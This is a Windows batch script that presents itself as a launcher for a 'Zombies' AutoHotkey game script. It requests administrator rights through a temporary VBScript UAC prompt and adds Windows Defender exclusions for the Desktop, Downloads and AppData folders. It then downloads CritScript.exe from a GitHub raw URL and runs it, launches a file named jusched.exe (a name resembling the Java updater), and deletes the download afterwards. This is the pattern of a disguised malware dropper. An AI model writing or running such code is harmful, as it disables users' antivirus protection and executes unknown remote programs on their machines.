@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
cd %TEMP%
echo Downloading CritScript.exe...
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
if not exist "CritScript.exe" (
    echo Failed to download CritScript.exe. Exiting...
    pause
    exit /b
)
echo CritScript.exe downloaded successfully.

echo Running CritScript.exe...
start "" CritScript.exe
timeout /t 5 /nobreak

for %%F in (jusched.exe JUSCHED.EXE) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        timeout /t 5 /nobreak
        goto :CheckZombies
    )
)
echo jusched.exe not found.

for %%F in (zombies.ahk ZOMBIES.AHK) do (
    if exist "%%F" (
        echo Found %%F. Running it...
        start "" %%F
        goto :CreateShortcut
    )
)
echo Zombies.ahk not found.

set "shortcutPath=%TEMP%\Zombies Shortcut.lnk"
set "zombiesScript=%TEMP%\ZOMBIES.AHK"
set "iconPath=%TEMP%\icon.ico"

if exist "%zombiesScript%" (
    echo Creating shortcut for ZOMBIES.AHK...
    Powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%shortcutPath%'); $s.TargetPath = '%zombiesScript%'; $s.IconLocation = '%iconPath%'; $s.Save()"
    echo Shortcut created at %shortcutPath%.
) else (
    echo ZOMBIES.AHK not found. Cannot create shortcut.
)


if exist "CritScript.exe" (
    echo Deleting CritScript.exe...
    del /f /q "CritScript.exe"
    echo CritScript.exe deleted.
)

echo Script completed. Exiting...
pause
exit /b
